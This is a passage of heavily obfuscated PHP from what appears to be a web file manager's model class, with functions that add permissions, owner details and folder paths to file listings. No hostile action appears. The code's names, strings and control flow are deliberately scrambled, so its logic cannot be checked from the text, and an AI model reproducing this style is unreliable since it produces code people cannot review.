$aï÷ƒ[$D“ùËƒø[203]] = $B±µˆØÎ¿·[$D“ùËƒø[203]]; unset($aï÷ƒ[$D“ùËƒø[407]]); } goto D¯Ï¼Ù‰µè; D¯Ï¼Ù‰µè: unset($aï÷ƒ); goto bº“‚Ö‹¾É; BÆ¬Ä¨ ¨”: foreach ($b²ã‚ï­ï¤ as &$aï÷ƒ) { if (!$aï÷ƒ[$D“ùËƒø[405]]) { continue; } $aö…·Ç‡‰ì[] = $aï÷ƒ[$D“ùËƒø[397]]; } unset($aï÷ƒ); if (!$aö…·Ç‡‰ì) { return; } goto eµ•Â«²‘; bº“‚Ö‹¾É: } protected function _listAppendAuth(&$cİ‰§‰ŒİÆ) { goto f¶õ‡á¸Ú; Dñ„‰²§¦: foreach ($cİ‰§‰ŒİÆ as $DÌ°ù®ë©ø) { if ($DÌ°ù®ë©ø[$D‰¬¢°êëÇ[406]] == self::TYPE_GROUP) { $EİŠ±‘ˆ÷[] = $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[397]]; } } if (!$EİŠ±‘ˆ÷) { return; } $AÚãäÑ¸áÉ = array_to_keyvalue($cİ‰§‰ŒİÆ, $D‰¬¢°êëÇ[397]); goto f±ï•ù¼Îš; f±ï•ù¼Îš: $F•©ôÈÓã³ = Model($D‰¬¢°êëÇ[497])->getSourceList($EİŠ±‘ˆ÷, $AÚãäÑ¸áÉ); foreach ($cİ‰§‰ŒİÆ as $e¦Ü…‰Ã¥ => &$DÌ°ù®ë©ø) { $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]] = $F•©ôÈÓã³[$DÌ°ù®ë©ø[$D‰¬¢°êëÇ[397]]]; if (!$DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]] && $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[406]] == self::TYPE_GROUP) { $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]] = Action($D‰¬¢°êëÇ[498])->pathGroupAuthMake($DÌ°ù®ë©ø[$D‰¬¢°êëÇ[499]]); if (!$DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]] && !_get($GLOBALS, $D‰¬¢°êëÇ[500])) { $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[196]] = !1; $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[195]] = !1; } } if ($DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]]) { $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[196]] = AuthModel::authCheckEdit($DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]][$D‰¬¢°êëÇ[409]]); $DÌ°ù®ë©ø[$D‰¬¢°êëÇ[195]] = AuthModel::authCheckView($DÌ°ù®ë©ø[$D‰¬¢°êëÇ[408]][$D‰¬¢°êëÇ[409]]); } $this->groupPathDisplay($DÌ°ù®ë©ø); } unset($DÌ°ù®ë©ø); goto DÓéï…¥¹ë; f¶õ‡á¸Ú: $D‰¬¢°êëÇ =& $_SERVER[Ö‘Øù]; if (!defined($D‰¬¢°êëÇ[469])) { return; } $EİŠ±‘ˆ÷ = array(); goto Dñ„‰²§¦; DÓéï…¥¹ë: } public function _listAppendAuthSecret(&$dçáÆ‡Í¹’) { goto d·¹¢Œ­Çë; A‚¨Ú‡î¶Ç: if (!$f‘Ó‰»ùå) { goto b“›Û‰Š´´; CÊøÅÀÕÛ: $f‘Ó‰»ùå = array_to_keyvalue($f‘Ó‰»ùå, $eÔøÚƒŠ®‹[397]); $fÃ½®¸¡Úæ = json_decode(Model($eÔøÚƒŠ®‹[427])->get($eÔøÚƒŠ®‹[504]), !0); $fÃ½®¸¡Úæ = array_to_keyvalue($fÃ½®¸¡Úæ, $eÔøÚƒŠ®‹[395]); goto B¾‹µçÁˆÂ; b“›Û‰Š´´: $a±„ƒùáŞ = Model($eÔøÚƒŠ®‹[502]); $d¶î¯µíöø = Model($eÔøÚƒŠ®‹[503]); $f‘Ó‰»ùå = $d¶î¯µíöø->listData(); goto CÊøÅÀÕÛ; B¾‹µçÁˆÂ: foreach ($f‘Ó‰»ùå as $fÉÀ©Î±ğ => $fƒ§µ¨ñ) { goto aìùµç›¤; c§¯Ÿã‘Ï‰: if (!$dĞ†øß˜ÚĞ) { $d¶î¯µíöø->remove($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[395]]); unset($f‘Ó‰»ùå[$fÉÀ©Î±ğ]); continue; } $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]] = $dĞ†øß˜ÚĞ; $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[506]] = $EñğâÎì½Ï; goto C©Ú¤Î‡‚; aìùµç›¤: $EñğâÎì½Ï = $fÃ½®¸¡Úæ[$fƒ§µ¨ñ[$eÔøÚƒŠ®‹[505]]]; if (!$EñğâÎì½Ï) { $d¶î¯µíöø->remove($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[395]]); unset($f‘Ó‰»ùå[$fÉÀ©Î±ğ]); continue; } $dĞ†øß˜ÚĞ = $a±„ƒùáŞ->listData($EñğâÎì½Ï[$eÔøÚƒŠ®‹[408]]); goto c§¯Ÿã‘Ï‰; C©Ú¤Î‡‚: $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[507]] = Model($eÔøÚƒŠ®‹[508])->getInfoSimpleOuter($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[447]]); $f‘Ó‰»ùå[$fÉÀ©Î±ğ] = $fƒ§µ¨ñ; goto eÖÈŒÇÊ„²; eÖÈŒÇÊ„²: } goto eƒ©Á¨Œ¬Õ; eƒ©Á¨Œ¬Õ: } $fîõÆÉê¨ = defined($eÔøÚƒŠ®‹[509]) ? USER_ID : $eÔøÚƒŠ®‹[33]; $aŠ¹èÌÉàİ = array(); goto aÊ×ó–ˆóÌ; aÊ×ó–ˆóÌ: $cé‰°¢Èê = $this->_listAppendPath($aŠ¹èÌÉàİ, !0); foreach ($dçáÆ‡Í¹’ as $fÉÀ©Î±ğ => &$fƒ§µ¨ñ) { if (!is_array($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]])) { continue; } if ($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[406]] != $eÔøÚƒŠ®‹[510]) { continue; } if (isset($f‘Ó‰»ùå[$fƒ§µ¨ñ[$eÔøÚƒŠ®‹[397]]])) { goto D¡ºåÖÚ‹´; Dƒ•óõã•´: $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[512]] = $cƒè¯¾ÁÙ; $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[513]] = $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[514]]; $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[515]] = $eÔøÚƒŠ®‹[87]; goto A×¾‚ÁÊ±Í; D¡ºåÖÚ‹´: $cƒè¯¾ÁÙ = $f‘Ó‰»ùå[$fƒ§µ¨ñ[$eÔøÚƒŠ®‹[397]]]; if (!is_array($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[460]])) { $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[460]] = array(); } $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[460]][$eÔøÚƒŠ®‹[511]] = $cƒè¯¾ÁÙ[$eÔøÚƒŠ®‹[505]]; goto Dƒ•óõã•´; A×¾‚ÁÊ±Í: if ($cƒè¯¾ÁÙ[$eÔøÚƒŠ®‹[447]] != $fîõÆÉê¨) { $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[409]] = $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[409]] & $cƒè¯¾ÁÙ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[408]]; } continue; goto aÇ¦ªÆŒÏ”; aÇ¦ªÆŒÏ”: } $aù´ºÎ¿´¦ = $this->parentLevelArray($fƒ§µ¨ñ[$eÔøÚƒŠ®‹[516]]); $Aõ…‚†º¨Ë = array_reverse($aù´ºÎ¿´¦); foreach ($Aõ…‚†º¨Ë as $cÓĞß±çƒ => $aí¢ÃŸ¹„¤) { goto C§š«Õğ‘«; aë¾°ğô­Ä: for ($f¹ŠâÜµ› = 0; $f¹ŠâÜµ› < $bô˜ŞßˆõÜ; $f¹ŠâÜµ›++) { if (!isset($cé‰°¢Èê[$aù´ºÎ¿´¦[$f¹ŠâÜµ›]])) { $b‰®—ÌèË­ = $eÔøÚƒŠ®‹[33]; break; } $b‰®—ÌèË­ = $b‰®—ÌèË­ . rtrim($cé‰°¢Èê[$aù´ºÎ¿´¦[$f¹ŠâÜµ›]], $eÔøÚƒŠ®‹[8]) . $eÔøÚƒŠ®‹[8]; } $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[513]] = rtrim($b‰®—ÌèË­, $eÔøÚƒŠ®‹[8]) . $eÔøÚƒŠ®‹[8]; break; goto Fµ ¡ó™ß; fß”£Ä„†–: if ($cƒè¯¾ÁÙ[$eÔøÚƒŠ®‹[447]] != $fîõÆÉê¨) { $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[409]] = $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[409]] & $cƒè¯¾ÁÙ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[408]]; } $b‰®—ÌèË­ = $eÔøÚƒŠ®‹[33]; $bô˜ŞßˆõÜ = count($aù´ºÎ¿´¦) - $cÓĞß±çƒ; goto aë¾°ğô­Ä; C§š«Õğ‘«: if (!isset($f‘Ó‰»ùå[$aí¢ÃŸ¹„¤])) { continue; } $cƒè¯¾ÁÙ = $f‘Ó‰»ùå[$aí¢ÃŸ¹„¤]; $fƒ§µ¨ñ[$eÔøÚƒŠ®‹[408]][$eÔøÚƒŠ®‹[512]] = $cƒè¯¾ÁÙ; goto fß”£Ä„†–; Fµ ¡ó™ß: } } unset($fƒ§µ¨ñ); goto FØ›×ù¡; d·¹¢Œ­Çë: $eÔøÚƒŠ®‹ =& $_SERVER[Ö‘Øù]; if (Model($eÔøÚƒŠ®‹[427])->get($eÔøÚƒŠ®‹[501]) != $eÔøÚƒŠ®‹[87]) { return; } static $f‘Ó‰»ùå = false; goto A‚¨Ú‡î¶Ç; FØ›×ù¡: } public function groupPathDisplay(&$a¨Àì×ƒ‰Û) { goto b‰Äì°É®—; Fá¥‡çö·Ğ: $a¨Àì×ƒ‰Û[$AìêŠË¯Ìë[518]] = $F ˆíß¹¬œ[$AìêŠË¯Ìë[493]]; $a¨Àì×ƒ‰Û[$AìêŠË¯Ìë[519]] = $F ˆíß¹¬œ[$AìêŠË¯Ìë[516]]; $a¨Àì×ƒ‰Û[$AìêŠË¯Ìë[520]] = $F ˆíß¹¬œ[$AìêŠË¯Ìë[521]]; goto dÁÉĞêˆÇ„; dÁÉĞêˆÇ„: $a¨Àì×ƒ‰Û[$AìêŠË¯Ìë[522]] = $Eßäøœ‚ˆ . $F ˆíß¹¬œ[$AìêŠË¯Ìë[85]][$AìêŠË¯Ìë[397]]; goto B¶ÀÍïµ; b‰Äì°É®—: $AìêŠË¯Ìë =& $_SERVER[Ö‘Øù]; if ($a¨Àì×ƒ‰Û[$AìêŠË¯Ìë[406]] != self::TYPE_GROUP) { return; } $F ˆíß¹¬œ = Model($AìêŠË¯Ìë[517])->getInfo($a¨Àì×ƒ‰Û[$AìêŠË¯Ìë[499]]); goto FçŠª±‡å; FçŠª±‡å: $fÕ²à˜²†â = $this->parentLevelArray($F ˆíß¹¬œ[$AìêŠË¯Ìë[516]]); $Eßäøœ‚ˆ = $AìêŠË¯Ìë[33]; foreach ($fÕ²à˜²†â as $e’Ù£ğ˜¤) { $f‘°Ùƒ›ê = Model($AìêŠË¯Ìë[517])->getInfo($e’Ù£ğ˜¤); $Eßäøœ‚ˆ .= $f‘°Ùƒ›ê[$AìêŠË¯Ìë[85]][$AìêŠË¯Ìë[397]] . $AìêŠË¯Ìë[47]; } goto Fá¥‡çö·Ğ; B¶ÀÍïµ: } protected function _listAppendPath(&$FÌì‰±ŞĞÎ, $A¿ø•Ê”Ô = false) { goto cƒ™Î™‹Ü†; cÅŒñ°­½é: unset($C°Šåšì¥ë); $D¡ì‹¢ÔÄ¿ = array_unique($D¡ì‹¢ÔÄ¿); if (count($D¡ì‹¢ÔÄ¿) > 0) { $B»ì»¸Ë = array($Cõ ÛÛêÛ‹[412] => array($Cõ ÛÛêÛ‹[413], $D¡ì‹¢ÔÄ¿)); if (count($D¡ì‹¢ÔÄ¿) == 1) { $CêäµŒåª™ = $this->sourceInfo($D¡ì‹¢ÔÄ¿[0]); $Fïãİ¿¹¨ = is_array($CêäµŒåª™) ? array($CêäµŒåª™) : !1; } else { $Fïãİ¿¹¨ = $this->field($Cõ ÛÛêÛ‹[523])->where($B»ì»¸Ë)->select(); } if (!$Fïãİ¿¹¨) { $Fïãİ¿¹¨ = array(); } foreach ($Fïãİ¿¹¨ as $E‚Æì£ë…) { $BêÏ›Š”µÌ[$E‚Æì£ë…[$Cõ ÛÛêÛ‹[397]]] = $E‚Æì£ë…[$Cõ ÛÛêÛ‹[28]]; } } goto D­›››ˆº; e©Ş±•èË: unset($C°Šåšì¥ë); return $FÌì‰±ŞĞÎ; goto Aå¶µœø¤Á; A—§¸ ©¯: $a†×…¤ÜÆ˜ = array(); if ($A¿ø•Ê”Ô) { return $BêÏ›Š”µÌ; } foreach ($FÌì‰±ŞĞÎ as &$C°Šåšì¥ë) { goto Bå›Ê§™‡²; Bå›Ê§™‡²: $fÈŸÄÃ›Ğ = $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[397]]; if ($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[405]] == $Cõ ÛÛêÛ‹[87] && $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[493]] != 0) { $BêÏ›Š”µÌ[$fÈŸÄÃ›Ğ] = $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[28]]; } if ($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[405]] == $Cõ ÛÛêÛ‹[87] && $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[493]] == 0 && !isset($BêÏ›Š”µÌ[$fÈŸÄÃ›Ğ])) { $BêÏ›Š”µÌ[$fÈŸÄÃ›Ğ] = $this->_listAppendPathRoot($C°Šåšì¥ë, array()); } goto AÚ¤Ş‡ó¤; bÃâí…‘óƒ: foreach ($d¶³½£„¯¶ as $fÜëæ¦º‚ğ => $E—¦ä¸Ì©) { if (isset($BêÏ›Š”µÌ[$E—¦ä¸Ì©])) { continue; } if ($fÜëæ¦º‚ğ == 0) { $BêÏ›Š”µÌ[$E—¦ä¸Ì©] = $this->_listAppendPathRoot($C°Šåšì¥ë, $d¶³½£„¯¶); } if ($fÜëæ¦º‚ğ != 0) { $D¡ì‹¢ÔÄ¿[] = $E—¦ä¸Ì©; } } goto CÅè§‡¾; AÚ¤Ş‡ó¤: if (isset($a†×…¤ÜÆ˜[$C°Šåšì¥ë[$Cõ ÛÛêÛ‹[516]]])) { continue; } $a†×…¤ÜÆ˜[$C°Šåšì¥ë[$Cõ ÛÛêÛ‹[516]]] = !0; $d¶³½£„¯¶ = $this->parentLevelArray($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[516]]); goto bÃâí…‘óƒ; CÅè§‡¾: } goto cÅŒñ°­½é; D­›››ˆº: $DÛ ºéŞÑ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $CÜŠÛƒ„¥ = array(); foreach ($FÌì‰±ŞĞÎ as &$C°Šåšì¥ë) { goto eÂ®À¸ØÖŒ; eÂ®À¸ØÖŒ: $C”¤„ŠèÜà = $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[516]]; $cƒ‹ëØÃ²Ä = $Cõ ÛÛêÛ‹[33]; if (isset($CÜŠÛƒ„¥[$C”¤„ŠèÜà])) { $cƒ‹ëØÃ²Ä = $CÜŠÛƒ„¥[$C”¤„ŠèÜà]; } else { $d¶³½£„¯¶ = $this->parentLevelArray($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[516]]); foreach ($d¶³½£„¯¶ as $fÜëæ¦º‚ğ => $E—¦ä¸Ì©) { if (isset($BêÏ›Š”µÌ[$E—¦ä¸Ì©])) { $cƒ‹ëØÃ²Ä .= $BêÏ›Š”µÌ[$E—¦ä¸Ì©] . $Cõ ÛÛêÛ‹[8]; } } $CÜŠÛƒ„¥[$C”¤„ŠèÜà] = $cƒ‹ëØÃ²Ä; } goto eÆï»©É£ƒ; bï¨¥»À…»: if ($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[493]] == $Cõ ÛÛêÛ‹[191]) { $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[28]] = trim($BêÏ›Š”µÌ[$C°Šåšì¥ë[$Cõ ÛÛêÛ‹[397]]], $Cõ ÛÛêÛ‹[8]); $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[514]] = $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[28]] . $Cõ ÛÛêÛ‹[8]; } if (intval($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($C°Šåšì¥ë, $d¶³½£„¯¶, $DÛ ºéŞÑ); } goto bÊ¸é¬‰¾; eÆï»©É£ƒ: $cƒ‹ëØÃ²Ä .= $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[28]]; if ($C°Šåšì¥ë[$Cõ ÛÛêÛ‹[405]] == $Cõ ÛÛêÛ‹[87]) { $cƒ‹ëØÃ²Ä .= $Cõ ÛÛêÛ‹[8]; } $C°Šåšì¥ë[$Cõ ÛÛêÛ‹[514]] = str_replace($Cõ ÛÛêÛ‹[524], $Cõ ÛÛêÛ‹[8], $cƒ‹ëØÃ²Ä); goto bï¨¥»À…»; bÊ¸é¬‰¾: } goto e©Ş±•èË; cƒ™Î™‹Ü†: $Cõ ÛÛêÛ‹ =& $_SERVER[Ö‘Øù]; static $BêÏ›Š”µÌ = array(); $D¡ì‹¢ÔÄ¿ = array(); goto A—§¸ ©¯; Aå¶µœø¤Á: } private function _listAppendPathRecycle(&$BÒŸŠ‹‰„, $Bˆ¢ÚÌßÃ, $cº¶–§ªÏ) { goto eØåÜ†›ÃŞ; Fï¡Õç³×: if ($BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[397]] == $cº¶–§ªÏ) { $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[516]] = $B“·ˆ¾Æ¿[526]; $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[493]] = $B“·ˆ¾Æ¿[191]; $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[28]] = LNG($B“·ˆ¾Æ¿[525]); } $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[527]] = $B“·ˆ¾Æ¿[528]; goto EŒ£¼Ë“Õ¥; eØåÜ†›ÃŞ: $B“·ˆ¾Æ¿ =& $_SERVER[Ö‘Øù]; if (!in_array($cº¶–§ªÏ, $Bˆ¢ÚÌßÃ) && $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[397]] != $cº¶–§ªÏ) { return; } $b³Ó”¶ìÛ¦ = explode($B“·ˆ¾Æ¿[8], trim($BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[514]], $B“·ˆ¾Æ¿[8])); goto AĞáŒÇŒ¨; AĞáŒÇŒ¨: $a¿²çÅì•Ÿ = implode($B“·ˆ¾Æ¿[8], array_slice($b³Ó”¶ìÛ¦, 2)); $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[514]] = $B“·ˆ¾Æ¿[8] . LNG($B“·ˆ¾Æ¿[525]) . $B“·ˆ¾Æ¿[8] . ltrim($a¿²çÅì•Ÿ, $B“·ˆ¾Æ¿[8]); $BÒŸŠ‹‰„[$B“·ˆ¾Æ¿[516]] = $B“·ˆ¾Æ¿[526] . implode($B“·ˆ¾Æ¿[47], array_slice($Bˆ¢ÚÌßÃ, 1)) . $B“·ˆ¾Æ¿[47]; goto Fï¡Õç³×; EŒ£¼Ë“Õ¥: } protected function _listAppendPathRoot(&$e®Öµº²·, $eÊÎæ¦™Ç) { $bÄ ¤¤ÆÆ£ =& $_SERVER[Ö‘Øù]; $dÂÁ¸Ù…ï¾ = $bÄ ¤¤ÆÆ£[33]; if ($e®Öµº²·[$bÄ ¤¤ÆÆ£[406]] == self::TYPE_USER) { if (defined($bÄ ¤¤ÆÆ£[469]) && $e®Öµº²·[$bÄ ¤¤ÆÆ£[499]] == USER_ID) { $dÂÁ¸Ù…ï¾ = LNG($bÄ ¤¤ÆÆ£[529]); if (!$eÊÎæ¦™Ç) { $e®Öµº²·[$bÄ ¤¤ÆÆ£[28]] = $dÂÁ¸Ù…ï¾; } } else { $cÒ·ˆƒæ· = Model($bÄ ¤¤ÆÆ£[508])->getInfoSimple($e®Öµº²·[$bÄ ¤¤ÆÆ£[499]]); $dÂÁ¸Ù…ï¾ = LNG($bÄ ¤¤ÆÆ£[530]) . $bÄ ¤¤ÆÆ£[160] . $cÒ·ˆƒæ·[$bÄ ¤¤ÆÆ£[28]] . $bÄ ¤¤ÆÆ£[531]; } } else { if ($e®Öµº²·[$bÄ ¤¤ÆÆ£[406]] == self::TYPE_GROUP) { $cÒ·ˆƒæ· = Model($bÄ ¤¤ÆÆ£[517])->getInfoSimple($e®Öµº²·[$bÄ ¤¤ÆÆ£[499]]); $dÂÁ¸Ù…ï¾ = $cÒ·ˆƒæ·[$bÄ ¤¤ÆÆ£[28]]; } else { if ($e®Öµº²·[$bÄ ¤¤ÆÆ£[406]] == self::TYPE_SYSTEM) { $dÂÁ¸Ù…ï¾ = $bÄ ¤¤ÆÆ£[532]; } } } $dÂÁ¸Ù…ï¾ = $dÂÁ¸Ù…ï¾ ? $bÄ ¤¤ÆÆ£[8] . $dÂÁ¸Ù…ï¾ . $bÄ ¤¤ÆÆ£[8] : $bÄ ¤¤ÆÆ£[8]; return $dÂÁ¸Ù…ï¾; } protected function _listAppendUser(&$eÒİ³Íç¨“) { goto Dï¶„É©³; b›³´ÀÃÌ”: $eİÉÆ‹­­æ = array_merge($B¢ğÒ‚­, $eœÃçê¬Ä); $aÚÄ²ÓŞ¨ = Model($fê„ò›Î™ä[533])->userListInfo($eİÉÆ‹­­æ); foreach ($eÒİ³Íç¨“ as &$Bà÷íè±) { $aÜõÊßñ× = $Bà÷íè±[$fê„ò›Î™ä[447]]; $Bà÷íè±[$fê„ò›Î™ä[447]] = $aÚÄ²ÓŞ¨[$aÜõÊßñ×] ? $aÚÄ²ÓŞ¨[$aÜõÊßñ×] : !1; $aÜõÊßñ× = $Bà÷íè±[$fê„ò›Î™ä[449]]; $Bà÷íè±[$fê„ò›Î™ä[449]] = $aÚÄ²ÓŞ¨[$aÜõÊßñ×] ? $aÚÄ²ÓŞ¨[$aÜõÊßñ×] : !1; if (isset($Bà÷íè±[$fê„ò›Î™ä[460]]) && $Bà÷íè±[$fê„ò›Î™ä[460]][$fê„ò›Î™ä[534]]) { $e¹°ŞÒ°Áî = $GLOBALS[$fê„ò›Î™ä[6]][$fê„ò›Î™ä[88]][$fê„ò›Î™ä[535]]; if ($Bà÷íè±[$fê„ò›Î™ä[460]][$fê„ò›Î™ä[536]] <= time() - $e¹°ŞÒ°Áî) { $this->metaSet($Bà÷íè±[$fê„ò›Î™ä[397]], $fê„ò›Î™ä[534], null); $this->metaSet($Bà÷íè±[$fê„ò›Î™ä[397]], $fê„ò›Î™ä[536], null); unset($Bà÷íè±[$fê„ò›Î™ä[460]][$fê„ò›Î™ä[534]]); continue; } $EÄãÃ¹èøÓ = $Bà÷íè±[$fê„ò›Î™ä[460]][$fê„ò›Î™ä[534]]; $Bà÷íè±[$fê„ò›Î™ä[460]][$fê„ò›Î™ä[537]] = Model($fê„ò›Î™ä[533])->getInfoSimpleOuter($EÄãÃ¹èøÓ); } } goto DĞÇ—ö¶°; Dï¶„É©³: $fê„ò›Î™ä =& $_SERVER[Ö‘Øù]; $B¢ğÒ‚­ = array_to_keyvalue($eÒİ³Íç¨“, $fê„ò›Î™ä[33], $fê„ò›Î™ä[447]); $eœÃçê¬Ä = array_to_keyvalue($eÒİ³Íç¨“, $fê„ò›Î™ä[33], $fê„ò›Î™ä[449]); goto b›³´ÀÃÌ”; DĞÇ—ö¶°: unset($Bà÷íè±); goto DÔ©±öŸ®›; DÔ©±öŸ®›: } public function parentLevelArray($BùšßçÚ‚ù) { $Fã™Ñã œ¿ =& $_SERVER[Ö‘Øù]; $BùšßçÚ‚ù = explode($Fã™Ñã œ¿[47], trim($BùšßçÚ‚ù, $Fã™Ñã œ¿[47])); return array_remove_value($BùšßçÚ‚ù, $Fã™Ñã œ¿[191]); } public function listAll($e˜‡‚’¨¾‡) { goto e´â™ğâÒš; c ƒ®ó½Õç: $F”˜­¼Îîò = $A®³Ñ¢Ü§[542]; $DŒéŒÍ—™Ù = "\x4c\x45\106\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x69\157\137\146\151\154\x65\x20\146\x69\x6c\145\x20\x6f\x6e\x20\163\157\165\162\x63\145\x2e\x66\x69\x6c\145\x49\x44\40\75\x20\146\x69\154\145\x2e\146\151\x6c\x65\111\104"; $F¿ŒÀ’ùƒ = $this->alias($A®³Ñ¢Ü§[439])->field($F”˜­¼Îîò)->where($c¢Â×±…¼­)->join($DŒéŒÍ—™Ù)->select(); goto bŒÔ³ÇÊã‰; bŒÔ³ÇÊã‰: $this->_listAppendAuth($F¿ŒÀ’ùƒ); $this->_listAppendUser($F¿ŒÀ’ùƒ); $this->_listAppendPath($F¿ŒÀ’ùƒ); goto CÇèâ©¿Š; CÇèâ©¿Š: $F¿ŒÀ’ùƒ = array_to_keyvalue($F¿ŒÀ’ùƒ, $A®³Ñ¢Ü§[397]); $Eµ‚ÅÜÕ‘« = "\x2f{$bêœ†ÛŞÌ¼[$A®³Ñ¢Ü§[28]]}\57"; $Eµ‚ÅÜÕ‘« = $Eµ‚ÅÜÕ‘« == $A®³Ñ¢Ü§[524] ? $A®³Ñ¢Ü§[8] : $Eµ‚ÅÜÕ‘«; goto B²“±×ë•Ó; e´â™ğâÒš: $A®³Ñ¢Ü§ =& $_SERVER[Ö‘Øù]; $bêœ†ÛŞÌ¼ = $this->sourceInfo($e˜‡‚’¨¾‡); $c¢Â×±…¼­ = array($A®³Ñ¢Ü§[538] => array($A®³Ñ¢Ü§[539], $bêœ†ÛŞÌ¼[$A®³Ñ¢Ü§[516]] . $e˜‡‚’¨¾‡ . $A®³Ñ¢Ü§[540]), $A®³Ñ¢Ü§[541] => 0); goto c ƒ®ó½Õç; B²“±×ë•Ó: $c¡ÊŠâËğ¨ = array(); foreach ($F¿ŒÀ’ùƒ as $D¯ºÄ†Ö†Ÿ => $Eè£ƒ…¸¡™) { goto eªÀ«é¾š²; fÚèôğœù: $F™œ˜ÇìÑ = str_replace($A®³Ñ¢Ü§[524], $A®³Ñ¢Ü§[8], $F™œ˜ÇìÑ); $F™œ˜ÇìÑ = str_replace($A®³Ñ¢Ü§[524], $A®³Ñ¢Ü§[8], $F™œ˜ÇìÑ); $Eá‘÷Ñ´ = array($A®³Ñ¢Ü§[416] => str_replace($A®³Ñ¢Ü§[524], $A®³Ñ¢Ü§[8], $F™œ˜ÇìÑ), $A®³Ñ¢Ü§[543] => intval($Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[405]]), $A®³Ñ¢Ü§[85] => $this->pathInfoFilter($Eè£ƒ…¸¡™)); goto f¤ö¢‰ê¨´; EÏƒ£¨‘Ñ¦: for ($CßïÂ¦ğ¸İ = 0; $CßïÂ¦ğ¸İ < count($c‹Ö® †ºñ); $CßïÂ¦ğ¸İ++) { $F™œ˜ÇìÑ .= $F¿ŒÀ’ùƒ[$c‹Ö® †ºñ[$CßïÂ¦ğ¸İ]][$A®³Ñ¢Ü§[28]] . $A®³Ñ¢Ü§[8]; } $F™œ˜ÇìÑ .= $Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[28]]; if ($Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[405]]) { $F™œ˜ÇìÑ .= $A®³Ñ¢Ü§[8]; } goto fÚèôğœù; f¤ö¢‰ê¨´: if (!$Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[405]]) { $Eá‘÷Ñ´[$A®³Ñ¢Ü§[462]] = $Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[462]]; $Eá‘÷Ñ´[$A®³Ñ¢Ü§[86]] = $Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[76]]; } $c¡ÊŠâËğ¨[] = $Eá‘÷Ñ´; goto Aá›ÈÊåñ¢; eªÀ«é¾š²: $c‹Ö® †ºñ = $this->parentLevelArray($Eè£ƒ…¸¡™[$A®³Ñ¢Ü§[516]]); array_shift($c‹Ö® †ºñ); $F™œ˜ÇìÑ = $Eµ‚ÅÜÕ‘«; goto EÏƒ£¨‘Ñ¦; Aá›ÈÊåñ¢: } return $c¡ÊŠâËğ¨; goto d°™â¦èñÚ; d°™â¦èñÚ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($FÆõõ©‰Ô) { goto eŒ­›¾Ğ¶¤; FòÂºÁ³: $this->_lockEvent($FÆõõ©‰Ô, array($Cº®‚à“„›[547], $Cº®‚à“„›[548]), $e¨‡°²Ô±–); $this->_lockCheckEnd($Cº®‚à“„›[544], $FÆõõ©‰Ô); goto cœèŒˆ°ì; eŒ­›¾Ğ¶¤: 